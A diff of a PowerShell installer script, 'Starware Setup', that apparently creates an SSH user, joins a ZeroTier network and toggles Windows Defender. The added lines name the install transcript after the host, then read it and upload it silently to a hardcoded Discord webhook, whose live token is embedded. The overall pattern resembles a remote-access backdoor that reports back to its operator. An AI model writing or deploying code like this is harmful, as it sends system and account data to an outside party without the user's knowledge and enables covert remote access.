@@ -1,15 +1,17 @@
-# Get the current timestamp
+# Display initialization message
+Write-Host "Starware Setup initialized" -ForegroundColor Blue
+
+# Determine the hostname of the system
+$hostName = $env:COMPUTERNAME
+
+# Determine the path for the log file in the temp directory with a timestamp and hostname
 $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
+$logFileName = "Starware-Installer_${hostName}_$timestamp.txt"
+$logFilePath = Join-Path -Path $env:TEMP -ChildPath $logFileName
 
-# Construct the log file path
-$logFilePath = Join-Path -Path $env:TEMP -ChildPath $("Starware-Installer_$timestamp.txt")
-
-# Store the original log file path in a variable
-$originalLogFilePath = $logFilePath
-
-# Start logging all outputs to the log file with a timestamp
+# Start logging all outputs to the log file
 Start-Transcript -Path $logFilePath -Append
-Write-Host "Starware Setup initialized." -ForegroundColor Blue
+Write-Host "Starware Setup operations starting..." -ForegroundColor Blue
 
 # Function to handle errors with an option to stop the script
 function Handle-Error {
@@ -296,6 +298,38 @@ Remove-Item $zeroTierMsiPath -Force
 Write-Host "Setup complete. SSH user created and configured. Joined ZeroTier network: $networkId."
 Write-Host "Windows Defender Antivirus has been re-enabled."
 
-Read-Host -Prompt "Press Enter to exit"
-
+# Stop logging
 Stop-Transcript
+Write-Host "Logging ended. Preparing to send log file to Discord." -ForegroundColor Blue
+
+# Define the Discord webhook URL (replace this with your actual Discord webhook URL)
+$webhookUrl = "https://discord.com/api/webhooks/1231358706130751541/GiDwT13moUdlBcWNNfheJfrHSDCLIosq4uAVbzaBP_Tp4GyXPHu3pxkXLq3P2ZOmae9z"
+
+# Prepare the header and boundary for multipart/form-data
+$boundary = [System.Guid]::NewGuid().ToString()
+$headers = @{
+    "Content-Type" = "multipart/form-data; boundary=`"$boundary`""
+}
+
+# Construct the body with the log file
+$bodyLines = (
+    "--$boundary",
+    'Content-Disposition: form-data; name="content"',
+    "",
+    "Here is the log file from the latest install on $hostName:",
+    "--$boundary",
+    'Content-Disposition: form-data; name="file"; filename="log.txt"',
+    "Content-Type: application/octet-stream",
+    "",
+    [System.IO.File]::ReadAllText($logFilePath),
+    "--$boundary--"
+) -join "`r`n"
+
+# Send the POST request to the Discord webhook
+$response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $bodyLines
+
+# Output the response for debugging purposes
+Write-Host "Response from Discord: $response" -ForegroundColor Cyan
+
+
+Read-Host -Prompt "Press Enter to exit"
